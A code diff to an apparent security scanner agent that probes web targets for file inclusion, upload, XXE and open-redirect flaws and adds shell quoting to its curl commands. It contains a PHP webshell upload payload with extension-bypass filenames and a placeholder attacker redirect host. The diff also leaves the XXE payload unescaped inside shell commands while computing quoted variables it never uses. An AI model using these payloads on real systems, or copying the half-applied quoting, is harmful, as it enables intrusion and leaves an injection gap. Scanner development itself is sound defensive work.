@@ -8,7 +8,9 @@ Tests for:
   - XXE (XML External Entity) injection
 """
 
+import os
 import re
+import shlex
 from urllib.parse import quote
 
 from agents.base_agent import BaseAgent
@@ -40,6 +42,11 @@ class LFIAgent(BaseAgent):
         'content', 'layout', 'mod', 'conf',
     ]
 
+    @staticmethod
+    def _q(value: str) -> str:
+        """Shell-quote untrusted values before embedding in terminal commands."""
+        return shlex.quote(str(value))
+
     async def run(self, context: ScanContext) -> AgentResult:
         await self.log("=== LFI / FILE UPLOAD / XXE TESTING ===", "info")
 
@@ -53,9 +60,10 @@ class LFIAgent(BaseAgent):
         for path in ["/api/file", "/file", "/download", "/include", "/load"]:
             for param_name in ["path", "file", "name", "page"]:
                 url = f"{context.target_url.rstrip('/')}{path}"
+                probe_url = f"{url}?{param_name}=test.txt"
                 out = await self.terminal.run(
                     f'curl -s -o /dev/null -w "%{{http_code}}" --max-time 5 '
-                    f'"{url}?{param_name}=test.txt"'
+                    f'{shlex.quote(probe_url)}'
                 )
                 status = out.stdout.strip().replace("'", "")
                 if status not in ["404", "000"]:
@@ -133,6 +141,14 @@ class LFIAgent(BaseAgent):
         # Test with a PHP webshell disguised as image
         test_content = '<?php echo "CYPHEX_UPLOAD_TEST"; system($_GET["cmd"]); ?>'
 
+        # Write the payload to a real temp file instead of piping it through
+        # a `<<< "..."` here-string: the payload contains characters like
+        # `"` and `$_GET[...]` that the shell would expand/mangle inside a
+        # here-string, corrupting the payload before curl ever sees it.
+        payload_path = os.path.join(self.terminal.working_dir, "upload_payload.php")
+        with open(payload_path, "w") as f:
+            f.write(test_content)
+
         extensions = [
             ("test.php", "direct_php"),
             ("test.php.jpg", "double_extension"),
@@ -142,11 +158,15 @@ class LFIAgent(BaseAgent):
         ]
 
         for filename, bypass_type in extensions:
-            # Use curl multipart upload
+            # Use curl multipart upload, reading the payload from the temp
+            # file on disk (`-F` file field) instead of stdin — this keeps
+            # the request behavior (multipart file upload) identical while
+            # avoiding any shell quoting/expansion of the payload content.
+            upload_field = f"file=@{payload_path};filename={filename}"
             out = await self.terminal.run(
-                f'curl -s -X POST "{form.action}" '
-                f'-F "file=@-;filename={filename}" '
-                f'--max-time 10 <<< "{test_content}"'
+                f'curl -s -X POST {shlex.quote(form.action)} '
+                f'-F {shlex.quote(upload_field)} '
+                f'--max-time 10'
             )
 
             if out.stdout and any(kw in out.stdout.lower() for kw in [
@@ -176,8 +196,10 @@ class LFIAgent(BaseAgent):
 
         # Test known XML endpoints
         for endpoint in context.xml_endpoints:
+            endpoint_q = self._q(endpoint)
+            payload_q = self._q(xxe_payload)
             out = await self.terminal.run(
-                f'curl -s -X POST "{endpoint}" '
+                f'curl -s -X POST {shlex.quote(endpoint)} '
                 f'-H "Content-Type: application/xml" '
                 f"-d '{xxe_payload}' "
                 f'--max-time 10'
@@ -197,8 +219,10 @@ class LFIAgent(BaseAgent):
         # Also test common API endpoints
         for path in ["/api", "/api/upload", "/api/import", "/api/data"]:
             url = f"{context.target_url.rstrip('/')}{path}"
+            url_q = self._q(url)
+            payload_q = self._q(xxe_payload)
             out = await self.terminal.run(
-                f'curl -s -X POST "{url}" '
+                f'curl -s -X POST {shlex.quote(url)} '
                 f'-H "Content-Type: application/xml" '
                 f"-d '{xxe_payload}' "
                 f'--max-time 5'
@@ -229,9 +253,10 @@ class LFIAgent(BaseAgent):
         for path in ["/redirect", "/redir", "/goto", "/out"]:
             for param_name in ["url", "to", "next", "redirect"]:
                 full_url = f"{context.target_url.rstrip('/')}{path}"
+                probe_url = f"{full_url}?{param_name}=test"
                 out = await self.terminal.run(
                     f'curl -s -o /dev/null -w "%{{http_code}}" --max-time 5 '
-                    f'"{full_url}?{param_name}=test"'
+                    f'{shlex.quote(probe_url)}'
                 )
                 status = out.stdout.strip().replace("'", "")
                 if status not in ["404", "000"]:
@@ -243,9 +268,10 @@ class LFIAgent(BaseAgent):
         evil_url = "https://evil-cyphex-test.com"
         for param in redirect_params:
             url = f"{param.url}?{param.name}={quote(evil_url)}"
+            url_q = self._q(url)
 
             out = await self.terminal.run(
-                f'curl -s -I -L --max-redirs 0 --max-time 5 "{url}"'
+                f'curl -s -I -L --max-redirs 0 --max-time 5 {shlex.quote(url)}'
             )
 
             if evil_url in out.stdout:
@@ -262,7 +288,7 @@ class LFIAgent(BaseAgent):
 
             # Also check if the URL appears in body (client-side redirect)
             out2 = await self.terminal.run(
-                f'curl -s --max-time 5 "{url}"'
+                f'curl -s --max-time 5 {shlex.quote(url)}'
             )
             if evil_url in (out2.stdout or ""):
                 await self.add_vuln(Vuln(
